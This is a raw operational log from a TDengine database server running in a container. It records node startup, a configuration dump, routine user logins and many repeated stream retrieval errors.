08/28 00:45:48.796850 dnd mnode:1, 364407f8615f:6030
08/28 00:45:48.797057 vnd vgid:3, read vnode cfg successfully, replcia:1
08/28 00:45:48.797057 vnd vgid:2, read vnode cfg successfully, replcia:1
08/28 00:45:48.797070 vnd vgid:3, dnode:1, 364407f8615f:6040
08/28 00:45:48.797075 vnd vgid:2, dnode:1, 364407f8615f:6040
08/28 00:45:48.797101 vnd vgid:3, read vnode version successfully, version:31504304
08/28 00:45:48.802564 vnd vgid:2, sync role changed from 0 to 4
08/28 00:45:48.813983 vnd vgid:3, sync role changed from 0 to 4
08/28 00:45:48.814069 dnd there are total vnodes:2, openned:2 failed:0
08/28 00:45:48.814082 dnd dnode mgmt is initialized
08/28 00:45:48.814108 mnd starting to initialize mnode ...
08/28 00:45:48.814751 mnd sdb write is opened
08/28 00:45:48.814760 sdb open sdb wal for restore
08/28 00:45:48.815107 mnd cluster id is set to be289e93-a157-4be2-8edc-649d0f8033ae
08/28 00:45:48.815117 mnd update mnodes epset, numofeps:1 08/28 00:45:48.815132 mnd mnode:1, ep:364407f8615f:6030 master
08/28 00:45:48.815378 sdb sdb is restored, ver:23 totalrows:21 numoftables:9
08/28 00:45:48.815389 sdb work as mnode, replica:1
08/28 00:45:48.815396 sdb mnode:1, 364407f8615f:6040
08/28 00:45:48.815445 sdb mnode role changed from master to master
08/28 00:45:48.815453 sdb update mnodes sync roles, total:1
08/28 00:45:48.815456 sdb mnode:1, role:master
08/28 00:45:48.815460 mnd cluster id is set to be289e93-a157-4be2-8edc-649d0f8033ae
08/28 00:45:48.815467 mnd update mnodes epset, numofeps:1 08/28 00:45:48.815479 mnd mnode:1, ep:364407f8615f:6030 master
08/28 00:45:48.815499 mnd dnode:1 set access:0 to 0
08/28 00:45:48.815592 mnd mnode is initialized successfully
08/28 00:45:48.815653 utl the old unlimited para: rlim_cur=18446744073709551615, rlim_max=18446744073709551615
08/28 00:45:48.815663 utl the new unlimited para: rlim_cur=18446744073709551615, rlim_max=18446744073709551615
08/28 00:45:48.815676 utl _sysctl(kern_core_uses_pid) set fail: operation not permitted
08/28 00:45:48.815684 utl the old core_uses_pid[4]: 0
08/28 00:45:48.815694 utl _sysctl(kern_core_uses_pid) get fail: operation not permitted
08/28 00:45:48.815702 utl the new core_uses_pid[4]: 0
08/28 00:45:48.816024 dnd dnode mgmt timer is initialized
08/28 00:45:48.816391 dnd shell rpc server is opened
08/28 00:45:48.816414 htp start http server ...
08/28 00:45:48.816599 mon start monitor module
08/28 00:45:48.816607 dnd tdengine is initialized successfully
08/28 00:45:48.816619 htp http server init success at 6041
08/28 00:45:48.826463 mon starting to initialize monitor service ..
08/28 00:45:48.827066 mnd user:monitor login from 172.17.0.2, result:success
08/28 00:45:48.827517 mon dnode:364407f8615f:6030 is started
08/28 00:45:48.828431 mon monitor service init success
08/28 00:45:49.316720 dnd module status:6 is received, start mnode module
08/28 00:45:49.316734 mnd mnode module already started...
08/28 00:45:49.822177 mnd user:_root login from 127.0.0.1, result:success
08/28 00:45:49.822875 tsc warn stream: , last timestamp:0, reset to:1598575440000
08/28 00:45:49.823059 tsc warn stream: , last timestamp:0, reset to:1598574600000
08/28 00:46:00.400300 mnd user:root login from 172.17.0.2, result:success
08/28 00:46:37.796622 tsc error qhandle is null
08/28 00:46:37.796643 tsc error add into queued async res, code:invalid qhandle
08/28 00:46:37.796659 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:47:02.206977 tsc error qhandle is null
08/28 00:47:02.206990 tsc error add into queued async res, code:invalid qhandle
08/28 00:47:02.207012 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:47:04.796774 tsc error qhandle is null
08/28 00:47:04.796787 tsc error add into queued async res, code:invalid qhandle
08/28 00:47:04.796804 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:47:24.666958 tsc error qhandle is null
08/28 00:47:24.666971 tsc error add into queued async res, code:invalid qhandle
08/28 00:47:24.666984 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:47:41.096967 tsc error qhandle is null
08/28 00:47:41.096979 tsc error add into queued async res, code:invalid qhandle
08/28 00:47:41.096992 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:47:42.796664 tsc error qhandle is null
08/28 00:47:42.796678 tsc error add into queued async res, code:invalid qhandle
08/28 00:47:42.796697 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:47:58.706755 tsc error qhandle is null
08/28 00:47:58.706770 tsc error add into queued async res, code:invalid qhandle
08/28 00:47:58.706783 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:48:28.797002 tsc error qhandle is null
08/28 00:48:28.797019 tsc error add into queued async res, code:invalid qhandle
08/28 00:48:28.797036 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:48:30.796887 tsc error qhandle is null
08/28 00:48:30.796905 tsc error add into queued async res, code:invalid qhandle
08/28 00:48:30.796922 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:48:59.181979 tsc error qhandle is null
08/28 00:48:59.181991 tsc error add into queued async res, code:invalid qhandle
08/28 00:48:59.182007 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:49:14.796771 tsc error qhandle is null
08/28 00:49:14.796785 tsc error add into queued async res, code:invalid qhandle
08/28 00:49:14.796798 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:49:15.646610 tsc error qhandle is null
08/28 00:49:15.646625 tsc error add into queued async res, code:invalid qhandle
08/28 00:49:15.646639 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:49:31.446950 tsc error qhandle is null
08/28 00:49:31.446962 tsc error add into queued async res, code:invalid qhandle
08/28 00:49:31.446975 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:49:48.161767 tsc error qhandle is null
08/28 00:49:48.161780 tsc error add into queued async res, code:invalid qhandle
08/28 00:49:48.161793 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:50:03.796781 tsc error qhandle is null
08/28 00:50:03.796795 tsc error add into queued async res, code:invalid qhandle
08/28 00:50:03.796810 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:50:20.796974 tsc error qhandle is null
08/28 00:50:20.796988 tsc error add into queued async res, code:invalid qhandle
08/28 00:50:20.797001 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:50:36.236786 tsc error qhandle is null
08/28 00:50:36.236799 tsc error add into queued async res, code:invalid qhandle
08/28 00:50:36.236822 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:50:55.796962 tsc error qhandle is null
08/28 00:50:55.796973 tsc error add into queued async res, code:invalid qhandle
08/28 00:50:55.796987 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:51:13.411958 tsc error qhandle is null
08/28 00:51:13.411970 tsc error add into queued async res, code:invalid qhandle
08/28 00:51:13.411984 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:51:14.796611 tsc error qhandle is null
08/28 00:51:14.796626 tsc error add into queued async res, code:invalid qhandle
08/28 00:51:14.796640 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:51:32.131981 tsc error qhandle is null
08/28 00:51:32.131994 tsc error add into queued async res, code:invalid qhandle
08/28 00:51:32.132008 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:51:46.796802 tsc error qhandle is null
08/28 00:51:46.796816 tsc error add into queued async res, code:invalid qhandle
08/28 00:51:46.796831 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:52:01.436976 tsc error qhandle is null
08/28 00:52:01.436988 tsc error add into queued async res, code:invalid qhandle
08/28 00:52:01.437005 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:52:32.796963 tsc error qhandle is null
08/28 00:52:32.796975 tsc error add into queued async res, code:invalid qhandle
08/28 00:52:32.796989 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:52:34.796778 tsc error qhandle is null
08/28 00:52:34.796795 tsc error add into queued async res, code:invalid qhandle
08/28 00:52:34.796811 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:53:06.797000 tsc error qhandle is null
08/28 00:53:06.797013 tsc error add into queued async res, code:invalid qhandle
08/28 00:53:06.797026 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:53:19.796737 tsc error qhandle is null
08/28 00:53:19.796753 tsc error add into queued async res, code:invalid qhandle
08/28 00:53:19.796777 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:53:25.251784 tsc error qhandle is null
08/28 00:53:25.251799 tsc error add into queued async res, code:invalid qhandle
08/28 00:53:25.251814 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:53:42.156953 tsc error qhandle is null
08/28 00:53:42.156966 tsc error add into queued async res, code:invalid qhandle
08/28 00:53:42.156980 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:53:59.071760 tsc error qhandle is null
08/28 00:53:59.071773 tsc error add into queued async res, code:invalid qhandle
08/28 00:53:59.071788 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:54:08.796777 tsc error qhandle is null
08/28 00:54:08.796791 tsc error add into queued async res, code:invalid qhandle
08/28 00:54:08.796810 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:54:23.786756 tsc error qhandle is null
08/28 00:54:23.786770 tsc error add into queued async res, code:invalid qhandle
08/28 00:54:23.786788 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:54:27.386077 qry warn in memory buf page not sufficient, expand from 512 to 768, page size:4096
08/28 00:54:27.424751 qry warn in memory buf page not sufficient, expand from 768 to 1152, page size:4096
08/28 00:54:27.490010 qry warn in memory buf page not sufficient, expand from 1152 to 1728, page size:4096
08/28 00:54:27.588187 qry warn in memory buf page not sufficient, expand from 1728 to 2592, page size:4096
08/28 00:54:27.745659 qry warn in memory buf page not sufficient, expand from 2592 to 3888, page size:4096
08/28 00:54:55.796975 tsc error qhandle is null
08/28 00:54:55.796988 tsc error add into queued async res, code:invalid qhandle
08/28 00:54:55.797003 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:54:56.796612 tsc error qhandle is null
08/28 00:54:56.796628 tsc error add into queued async res, code:invalid qhandle
08/28 00:54:56.796643 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:55:22.491957 tsc error qhandle is null
08/28 00:55:22.491969 tsc error add into queued async res, code:invalid qhandle
08/28 00:55:22.491983 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:55:29.796786 tsc error qhandle is null
08/28 00:55:29.796801 tsc error add into queued async res, code:invalid qhandle
08/28 00:55:29.796816 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:55:56.796974 tsc error qhandle is null
08/28 00:55:56.796986 tsc error add into queued async res, code:invalid qhandle
08/28 00:55:56.797000 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:56:17.786969 tsc error qhandle is null
08/28 00:56:17.786981 tsc error add into queued async res, code:invalid qhandle
08/28 00:56:17.786997 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:56:18.796661 tsc error qhandle is null
08/28 00:56:18.796677 tsc error add into queued async res, code:invalid qhandle
08/28 00:56:18.796692 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:56:32.176791 tsc error qhandle is null
08/28 00:56:32.176806 tsc error add into queued async res, code:invalid qhandle
08/28 00:56:32.176824 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:56:48.881781 tsc error qhandle is null
08/28 00:56:48.881794 tsc error add into queued async res, code:invalid qhandle
08/28 00:56:48.881807 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:57:05.796775 tsc error qhandle is null
08/28 00:57:05.796789 tsc error add into queued async res, code:invalid qhandle
08/28 00:57:05.796806 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:57:09.361756 tsc error qhandle is null
08/28 00:57:09.361770 tsc error add into queued async res, code:invalid qhandle
08/28 00:57:09.361783 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:57:27.346776 tsc error qhandle is null
08/28 00:57:27.346788 tsc error add into queued async res, code:invalid qhandle
08/28 00:57:27.346808 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:57:53.796971 tsc error qhandle is null
08/28 00:57:53.796984 tsc error add into queued async res, code:invalid qhandle
08/28 00:57:53.796995 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:57:54.451608 tsc error qhandle is null
08/28 00:57:54.451622 tsc error add into queued async res, code:invalid qhandle
08/28 00:57:54.451636 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:58:13.991979 tsc error qhandle is null
08/28 00:58:13.991991 tsc error add into queued async res, code:invalid qhandle
08/28 00:58:13.992005 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:58:37.796988 tsc error qhandle is null
08/28 00:58:37.797004 tsc error add into queued async res, code:invalid qhandle
08/28 00:58:37.797026 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:58:41.761817 tsc error qhandle is null
08/28 00:58:41.761832 tsc error add into queued async res, code:invalid qhandle
08/28 00:58:41.761848 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:59:16.796979 tsc error qhandle is null
08/28 00:59:16.796991 tsc error add into queued async res, code:invalid qhandle
08/28 00:59:16.797010 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:59:23.796798 tsc error qhandle is null
08/28 00:59:23.796810 tsc error add into queued async res, code:invalid qhandle
08/28 00:59:23.796827 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:59:47.042006 tsc error qhandle is null
08/28 00:59:47.042018 tsc error add into queued async res, code:invalid qhandle
08/28 00:59:47.042036 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:20:03.835895 utl the old unlimited para: rlim_cur=18446744073709551615, rlim_max=18446744073709551615
08/28 01:20:03.835913 utl the new unlimited para: rlim_cur=18446744073709551615, rlim_max=18446744073709551615
08/28 01:20:03.835931 utl _sysctl(kern_core_uses_pid) set fail: operation not permitted
08/28 01:20:03.835934 utl the old core_uses_pid[4]: 0
08/28 01:20:03.835941 utl _sysctl(kern_core_uses_pid) get fail: operation not permitted
08/28 01:20:03.835944 utl the new core_uses_pid[4]: 0
08/28 01:20:03.836273 utl localep is: 364407f8615f:6030
08/28 01:20:03.837785 utl timezone not configured, set to system default: (utc, +0000)
08/28 01:20:03.837839 utl error locale not configured, set to system default:en_us.utf-8
08/28 01:20:03.837850 utl warn charset not configured, set to system default:utf-8
08/28 01:20:03.837894 utl taos config & system info:
08/28 01:20:03.837900 utl ==================================
08/28 01:20:03.837904 utl firstep: 364407f8615f:6030 08/28 01:20:03.837910 utl secondep: 364407f8615f:6030 08/28 01:20:03.837914 utl fqdn: 364407f8615f 08/28 01:20:03.837918 utl serverport: 6030 08/28 01:20:03.837921 utl configdir: /etc/taos 08/28 01:20:03.837924 utl logdir: /var/log/taos 08/28 01:20:03.837928 utl scriptdir: /etc/taos 08/28 01:20:03.837931 utl datadir: /var/lib/taos 08/28 01:20:03.837935 utl arbitrator: 08/28 01:20:03.837941 utl numofthreadspercore: 1.000000 08/28 01:20:03.837956 utl ratioofquerythreads: 0.500000 08/28 01:20:03.837959 utl numofmnodes: 3 08/28 01:20:03.837961 utl vnodebak: 1 08/28 01:20:03.837964 utl telemetryreporting: 1 08/28 01:20:03.837967 utl balance: 1 08/28 01:20:03.837971 utl balanceinterval: 300 08/28 01:20:03.837974 utl role: 0 08/28 01:20:03.837980 utl maxtmrctrl: 512 08/28 01:20:03.837983 utl monitorinterval: 30(s)
08/28 01:20:03.837990 utl offlinethreshold: 8640000(s)
08/28 01:20:03.837992 utl rpctimer: 1000(ms)
08/28 01:20:03.837996 utl rpcmaxtime: 600(s)
08/28 01:20:03.838003 utl statusinterval: 1(s)
08/28 01:20:03.838006 utl shellactivitytimer: 3(s)
08/28 01:20:03.838009 utl tablemetakeeptimer: 7200(s)
08/28 01:20:03.838012 utl minslidingtime: 10(ms)
08/28 01:20:03.838014 utl minintervaltime: 10(ms)
08/28 01:20:03.838016 utl maxstreamcompdelay: 20000(ms)
08/28 01:20:03.838018 utl maxfirststreamcompdelay:10000(ms)
08/28 01:20:03.838020 utl retrystreamcompdelay: 10(ms)
08/28 01:20:03.838022 utl streamcompdelayratio: 0.100000 08/28 01:20:03.838025 utl maxvgroupsperdb: 0 08/28 01:20:03.838027 utl maxtablespervnode: 1000000 08/28 01:20:03.838030 utl mintablespervnode: 1000 08/28 01:20:03.838035 utl tableincsteppervnode: 1000 08/28 01:20:03.838040 utl cache: 16(mb)
08/28 01:20:03.838044 utl blocks: 6 08/28 01:20:03.838051 utl days: 2 08/28 01:20:03.838055 utl keep: 3650 08/28 01:20:03.838058 utl minrows: 100 08/28 01:20:03.838064 utl maxrows: 4096 08/28 01:20:03.838068 utl comp: 2 08/28 01:20:03.838074 utl wallevel: 1 08/28 01:20:03.838077 utl fsync: 3000 08/28 01:20:03.838079 utl replica: 1 08/28 01:20:03.838082 utl quorum: 1 08/28 01:20:03.838090 utl compressmsgsize: -1 08/28 01:20:03.838092 utl maxsqllength: 65480(byte)
08/28 01:20:03.838095 utl maxnumoforderedres: 100000 08/28 01:20:03.838100 utl timezone: (utc, +0000) 08/28 01:20:03.838105 utl locale: en_us.utf-8 08/28 01:20:03.838108 utl charset: utf-8 08/28 01:20:03.838110 utl maxshellconns: 5000 08/28 01:20:03.838115 utl maxconnections: 5000 08/28 01:20:03.838119 utl minimallogdirgb: 0.100000(gb)
08/28 01:20:03.838122 utl minimaltmpdirgb: 0.100000(gb)
08/28 01:20:03.838125 utl minimaldatadirgb: 0.500000(gb)
08/28 01:20:03.838130 utl mnodeequalvnodenum: 4 08/28 01:20:03.838134 utl http: 1 08/28 01:20:03.838136 utl mqtt: 0 08/28 01:20:03.838138 utl monitor: 1 08/28 01:20:03.838142 utl httpcachesessions: 1000 08/28 01:20:03.838149 utl httpenablerecordsql: 0 08/28 01:20:03.838153 utl telegrafusefieldnum: 0 08/28 01:20:03.838162 utl httpmaxthreads: 2 08/28 01:20:03.838167 utl restfulrowlimit: 10240 08/28 01:20:03.838169 utl numofloglines: 10000000 08/28 01:20:03.838173 utl asynclog: 1 08/28 01:20:03.838176 utl debugflag: 0 08/28 01:20:03.838181 utl mdebugflag: 135 08/28 01:20:03.838184 utl ddebugflag: 135 08/28 01:20:03.838192 utl sdebugflag: 135 08/28 01:20:03.838197 utl wdebugflag: 135 08/28 01:20:03.838199 utl sdbdebugflag: 135 08/28 01:20:03.838201 utl rpcdebugflag: 131 08/28 01:20:03.838204 utl tmrdebugflag: 131 08/28 01:20:03.838210 utl cdebugflag: 131 08/28 01:20:03.838214 utl jnidebugflag: 131 08/28 01:20:03.838217 utl odbcdebugflag: 131 08/28 01:20:03.838225 utl udebugflag: 131 08/28 01:20:03.838231 utl httpdebugflag: 131 08/28 01:20:03.838234 utl mqttdebugflag: 131 08/28 01:20:03.838238 utl monitordebugflag: 131 08/28 01:20:03.838245 utl qdebugflag: 131 08/28 01:20:03.838249 utl vdebugflag: 131 08/28 01:20:03.838251 utl tsdbdebugflag: 131 08/28 01:20:03.838253 utl tscenablerecordsql: 0 08/28 01:20:03.838255 utl enablecorefile: 1 08/28 01:20:03.838257 utl gitinfo: 7ac6c2b8de3cd66e180132fc1cf77715237308a1 08/28 01:20:03.838261 utl gitinfoofinternal: 08/28 01:20:03.838266 utl buildinfo: built by root at 2020-08-17 11:12 08/28 01:20:03.838268 utl version: 2.0.1.0 08/28 01:20:03.838271 utl maxbinarydisplaywidth: 30 08/28 01:20:03.838275 utl os pagesize: 4096(kb)
08/28 01:20:03.838283 utl os openmax: 65536
08/28 01:20:03.838285 utl os streammax: 16
08/28 01:20:03.838287 utl os numofcores: 24
08/28 01:20:03.838289 utl os totaldisk: 7367.283203(gb)
08/28 01:20:03.838297 utl os totalmemory: 63723(mb)
08/28 01:20:03.838302 utl os sysname: linux
08/28 01:20:03.838309 utl os nodename: 364407f8615f
08/28 01:20:03.838315 utl os release: 3.10.0-957.el7.x86_64
08/28 01:20:03.838317 utl os version: #1 smp fri jan 11 17:34:50 cst 2019
08/28 01:20:03.838319 utl os machine: x86_64
08/28 01:20:03.838327 utl ==================================
08/28 01:20:03.838331 dnd start to initialize tdengine on 364407f8615f:6030
08/28 01:20:03.838556 dnd storage directory is initialized
08/28 01:20:03.838568 dnd dnode read is opened, min worker:24 max worker:48
08/28 01:20:03.838575 dnd dnode write is opened, max worker 24
08/28 01:20:03.838582 dnd dnode mread is opened
08/28 01:20:03.838586 dnd dnode mwrite is opened
08/28 01:20:03.838595 dnd dnode mpeer is opened
08/28 01:20:03.838982 dnd inter-dnodes rpc client is opened
08/28 01:20:03.839137 dnd inter-dnodes rpc server is opened
08/28 01:20:03.839185 dnd read numofvnodes successed, dnodeid:1
08/28 01:20:03.839219 dnd read mnode epset successed, numofeps:1 inuse:0
08/28 01:20:03.839226 dnd mnode:1, 364407f8615f:6030
08/28 01:20:03.839447 vnd vgid:3, read vnode cfg successfully, replcia:1
08/28 01:20:03.839450 vnd vgid:2, read vnode cfg successfully, replcia:1
08/28 01:20:03.839458 vnd vgid:3, dnode:1, 364407f8615f:6040
08/28 01:20:03.839459 vnd vgid:2, dnode:1, 364407f8615f:6040
08/28 01:20:03.839489 vnd vgid:3, read vnode version successfully, version:31504304
08/28 01:20:03.847645 vnd vgid:2, sync role changed from 0 to 4
08/28 01:20:03.857622 vnd vgid:3, sync role changed from 0 to 4
08/28 01:20:03.857714 dnd there are total vnodes:2, openned:2 failed:0
08/28 01:20:03.857727 dnd dnode mgmt is initialized
08/28 01:20:03.857754 mnd starting to initialize mnode ...
08/28 01:20:03.858397 mnd sdb write is opened
08/28 01:20:03.858406 sdb open sdb wal for restore
08/28 01:20:03.858750 mnd cluster id is set to be289e93-a157-4be2-8edc-649d0f8033ae
08/28 01:20:03.858762 mnd update mnodes epset, numofeps:1 08/28 01:20:03.858776 mnd mnode:1, ep:364407f8615f:6030 master
08/28 01:20:03.859001 sdb sdb is restored, ver:23 totalrows:21 numoftables:9
08/28 01:20:03.859011 sdb work as mnode, replica:1
08/28 01:20:03.859016 sdb mnode:1, 364407f8615f:6040
08/28 01:20:03.859068 sdb mnode role changed from master to master
08/28 01:20:03.859076 sdb update mnodes sync roles, total:1
08/28 01:20:03.859078 sdb mnode:1, role:master
08/28 01:20:03.859086 mnd cluster id is set to be289e93-a157-4be2-8edc-649d0f8033ae
08/28 01:20:03.859089 mnd update mnodes epset, numofeps:1 08/28 01:20:03.859097 mnd mnode:1, ep:364407f8615f:6030 master
08/28 01:20:03.859111 mnd dnode:1 set access:0 to 0
08/28 01:20:03.859193 mnd mnode is initialized successfully
08/28 01:20:03.859254 utl the old unlimited para: rlim_cur=18446744073709551615, rlim_max=18446744073709551615
08/28 01:20:03.859263 utl the new unlimited para: rlim_cur=18446744073709551615, rlim_max=18446744073709551615
08/28 01:20:03.859273 utl _sysctl(kern_core_uses_pid) set fail: operation not permitted
08/28 01:20:03.859278 utl the old core_uses_pid[4]: 0
08/28 01:20:03.859284 utl _sysctl(kern_core_uses_pid) get fail: operation not permitted
08/28 01:20:03.859290 utl the new core_uses_pid[4]: 0
08/28 01:20:03.859600 dnd dnode mgmt timer is initialized
08/28 01:20:03.859953 dnd shell rpc server is opened
08/28 01:20:03.859975 htp start http server ...
08/28 01:20:03.860167 mon start monitor module
08/28 01:20:03.860175 dnd tdengine is initialized successfully
08/28 01:20:03.860189 htp http server init success at 6041
08/28 01:20:03.873811 mon starting to initialize monitor service ..
08/28 01:20:03.874486 mnd user:monitor login from 172.17.0.2, result:success
08/28 01:20:03.874971 mon dnode:364407f8615f:6030 is started
08/28 01:20:03.875858 mon monitor service init success
08/28 01:20:04.366500 dnd module status:6 is received, start mnode module
08/28 01:20:04.366529 mnd mnode module already started...
08/28 01:20:04.864655 mnd user:_root login from 127.0.0.1, result:success
08/28 01:20:04.865429 tsc warn stream: , last timestamp:0, reset to:1598577540000
08/28 01:20:04.865469 tsc warn stream: , last timestamp:0, reset to:1598577000000
08/28 01:20:19.144499 mnd user:root login from 172.17.0.2, result:success
08/28 01:20:26.409184 tsc error qhandle is null
08/28 01:20:26.409208 tsc error add into queued async res, code:invalid qhandle
08/28 01:20:26.409230 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:20:27.976153 mnd error app: : , table:0.testdata.avg_vol, failed to create, table already exist
08/28 01:20:36.710328 mnd error app: : , table:0.testdata.avg_col, failed to get table meta, table not exist
08/28 01:20:58.839370 tsc error qhandle is null
08/28 01:20:58.839383 tsc error add into queued async res, code:invalid qhandle
08/28 01:20:58.839405 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:21:14.839310 tsc error qhandle is null
08/28 01:21:14.839323 tsc error add into queued async res, code:invalid qhandle
08/28 01:21:14.839339 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:21:26.593971 tsc error qhandle is null
08/28 01:21:26.593989 tsc error add into queued async res, code:invalid qhandle
08/28 01:21:26.594006 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:21:41.759120 tsc error qhandle is null
08/28 01:21:41.759135 tsc error add into queued async res, code:invalid qhandle
08/28 01:21:41.759148 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:21:56.839318 tsc error qhandle is null
08/28 01:21:56.839331 tsc error add into queued async res, code:invalid qhandle
08/28 01:21:56.839344 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:22:11.259184 tsc error qhandle is null
08/28 01:22:11.259199 tsc error add into queued async res, code:invalid qhandle
08/28 01:22:11.259214 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:22:27.904325 tsc error qhandle is null
08/28 01:22:27.904342 tsc error add into queued async res, code:invalid qhandle
08/28 01:22:27.904355 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:22:35.839132 tsc error qhandle is null
08/28 01:22:35.839150 tsc error add into queued async res, code:invalid qhandle
08/28 01:22:35.839168 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:22:50.749112 tsc error qhandle is null
08/28 01:22:50.749126 tsc error add into queued async res, code:invalid qhandle
08/28 01:22:50.749141 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:23:14.544323 tsc error qhandle is null
08/28 01:23:14.544337 tsc error add into queued async res, code:invalid qhandle
08/28 01:23:14.544351 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:23:23.839127 tsc error qhandle is null
08/28 01:23:23.839141 tsc error add into queued async res, code:invalid qhandle
08/28 01:23:23.839157 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:23:44.104308 tsc error qhandle is null
08/28 01:23:44.104321 tsc error add into queued async res, code:invalid qhandle
08/28 01:23:44.104334 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:23:56.838955 tsc error qhandle is null
08/28 01:23:56.838970 tsc error add into queued async res, code:invalid qhandle
08/28 01:23:56.838985 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:24:12.074142 tsc error qhandle is null
08/28 01:24:12.074157 tsc error add into queued async res, code:invalid qhandle
08/28 01:24:12.074172 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:24:36.019309 tsc error qhandle is null
08/28 01:24:36.019322 tsc error add into queued async res, code:invalid qhandle
08/28 01:24:36.019336 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:24:40.839139 tsc error qhandle is null
08/28 01:24:40.839151 tsc error add into queued async res, code:invalid qhandle
08/28 01:24:40.839165 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:25:06.334330 tsc error qhandle is null
08/28 01:25:06.334343 tsc error add into queued async res, code:invalid qhandle
08/28 01:25:06.334368 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:25:24.839297 tsc error qhandle is null
08/28 01:25:24.839311 tsc error add into queued async res, code:invalid qhandle
08/28 01:25:24.839324 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:25:31.614163 tsc error qhandle is null
08/28 01:25:31.614178 tsc error add into queued async res, code:invalid qhandle
08/28 01:25:31.614192 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:25:47.554318 tsc error qhandle is null
08/28 01:25:47.554331 tsc error add into queued async res, code:invalid qhandle
08/28 01:25:47.554347 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:26:04.839315 tsc error qhandle is null
08/28 01:26:04.839328 tsc error add into queued async res, code:invalid qhandle
08/28 01:26:04.839341 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:26:06.373964 tsc error qhandle is null
08/28 01:26:06.373977 tsc error add into queued async res, code:invalid qhandle
08/28 01:26:06.373992 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:26:27.799290 tsc error qhandle is null
08/28 01:26:27.799302 tsc error add into queued async res, code:invalid qhandle
08/28 01:26:27.799317 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:26:40.959139 tsc error qhandle is null
08/28 01:26:40.959154 tsc error add into queued async res, code:invalid qhandle
08/28 01:26:40.959176 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:26:48.839141 tsc error qhandle is null
08/28 01:26:48.839159 tsc error add into queued async res, code:invalid qhandle
08/28 01:26:48.839175 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:27:03.279128 tsc error qhandle is null
08/28 01:27:03.279143 tsc error add into queued async res, code:invalid qhandle
